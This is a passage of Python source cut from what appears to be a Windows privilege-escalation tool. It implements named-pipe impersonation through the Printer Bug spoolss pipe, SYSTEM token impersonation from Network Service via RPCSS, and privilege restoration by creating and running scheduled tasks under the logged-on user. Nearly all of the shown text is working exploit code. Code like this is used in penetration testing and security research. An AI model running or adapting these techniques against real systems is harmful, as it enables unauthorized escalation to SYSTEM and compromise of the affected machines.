        self.timeMaxAntiLock=15
        logging.debug("Starting named pipe impersonation via Printer Bug...")
        if MSRPRN_LOAD_SUCCESS == False:
            logging.error("Impossible to exploit PRINTER BUG local PE because MSRPRN is not loaded successfully")
            return False
        self.subPipeName = getRandomString()
        pipeName = r"\\.\pipe\{0}\pipe\spoolss".format(self.subPipeName)
        status = self.__namedPipeImpersonation(functionMethod=self.__createPrinterBugNamedPipeImpersonation, pipeName=pipeName, ps=False)
        self.timeMaxAntiLock=self.DEFAULT_TIME_MAX_ANTI_LOCK
        return status

    def __createSimpleNamedPipeConnection(self, *args):
        '''
        Connect to 127.0.0.1 named pipe defined in pipeName, send a random string and close connection.

        :param args:
        :return: True or False (if an error)
        '''
        logging.debug("Thread for RPCSS & Network Service starting")
        logging.debug("Sleeping 2 secods for server, ugly -:(")
        sleep(2)
        namePipe = self.pipeName.replace("\\\\.\\","\\\\127.0.0.1\\")
        try:
            logging.debug("Connection to named pipe {0}...".format(namePipe))
            pf = open(namePipe, 'w')
            data = getRandomString()
            pf.write(data)
            logging.debug("{0} sent over named pipe".format(repr(data)))
            pf.close()
            logging.debug("Named pipe connection closed")
        except Exception as e:
            logging.debug("Impossible to connect to server named pipe: {0}".format(e))
            return False
        logging.debug("Thread for RPCSS & Network Service finished")
        return True

    def namedPipeImpersonationSystemViaRPCSS(self):
        """
        Impersonate SYSTEM account thanks to Network Service and named pipe via RPCSS

        https://decoder.cloud/2020/05/04/from-network-service-to-system/
        :return: True or False (if an error)
        """
        logging.debug("Starting named pipe impersonation via RPCSS & Network Service...")
        status = self.__namedPipeImpersonation(functionMethod=self.__createSimpleNamedPipeConnection,
                                               pipeName=None,
                                               ps=False)
        imp = Impersonate()
        allTokens = imp.getAllTokensAccessible(targetPID=None)
        #imp.printTokensAccessibleByAccountNameAndPID()
        status = imp.impersonateFirstSystemToken(allTokens)
        imp.closeAllHandles(allTokens)
        return status

    def __createTaskForNamedPipeImpersonationWithLoggeOn(self, *args):
        '''
        Execute a command with current logged on user via Task Scheduler

        Create a task, execute as command (ps command, not cmd) as current user, connect to named pipe, impersonate and
        delete created task.
        :param args:
        :return: True if anti lock feature has not been triggered (no problem detected). Otherwise return False (anti
                 lock feature has been triggered) so a problem occured.
        '''
        logging.info("Executing the following command as current logged on user via Task Scheduler: {0} {1}".format(repr(self.cmd), repr(self.args)))
        account = TokenManager.getCurrentEffectiveAccountName()
        if account == None:
            logging.error("Impossible to get current effective username. Impossible to continue for creating task")
            # Anti lock feature: send a message to pipe if previous service failed
            return self.__startAntiLockFeature()
        taskName = getRandomString()
        # location = r"\\Microsoft\\Windows\\{0}".format(taskName)
        location = '\\'
        status = create_task(name=taskName,
                             location=location,
                             user_name=account['Name'],
                             password=None,
                             logon_type=TASK_LOGON_SERVICE_ACCOUNT,
                             cmd=self.cmd,
                             arguments=self.args,
                             force=True,
                             # Triggers
                             Enabled=True,
                             #
                             multiple_instances="No New Instance",
                             stop_if_on_batteries=False,
                             force_stop=False,
                             start_when_available=True,
                             run_if_network=False,
                             run_if_idle=False,
                             idle_stop_on_end=True,
                             idle_restart=False,
                             allow_demand_start=True,
                             hidden=False,
                             wake_to_run=False,
                             execution_time_limit=False,  # and ExecutionTimeLimit = 'PT0S' is set by default
                             restorePrivs=True,
                             privsToRestore=DEFAULT_NETWORK_SERVICE_PRIVS,
                             # Action
                             )
        if status != True:
            logging.error("Impossible to create the Task {0}: {1}".format(taskName, status))
        else:
            logging.debug("Task {0} created".format(taskName))
            status = run(taskName, location=location)
            if status == False:
                logging.error("Impossible to run the Task {0}: {1}".format(taskName, ""))
            else:
                pass
                '''
                logging.debug("Task {0} executed".format(taskName))
                status = delete_task(taskName, location=location)
                if status == False:
                    logging.warning("Impossible to delete the Task {0}: {1}".format(taskName, ""))
                else:
                    logging.debug("Task {0} deleted".format(taskName))
                '''
        # Anti lock feature: send a message to pipe if previous service failed
        return self.__startAntiLockFeature()

    def reGiveMePower(self, debug=False):
        """
        Try to regive full power (privileges) with task scheduling and named pipe impersonation

        :return: True, False (if an error)
        """
        logging.debug("Starting named pipe impersonation via Task Scheduler...")
        if TASKSCHD_LOAD_SUCCESS == False:
            logging.warning("Task Scheduler module is not loaded successfully. This command can not be completed")
            return False
        return self.__namedPipeImpersonation(functionMethod=self.__createTaskForNamedPipeImpersonationWithLoggeOn,
                                             ps=True,
                                             debug=debug,
                                             pingCmd=False)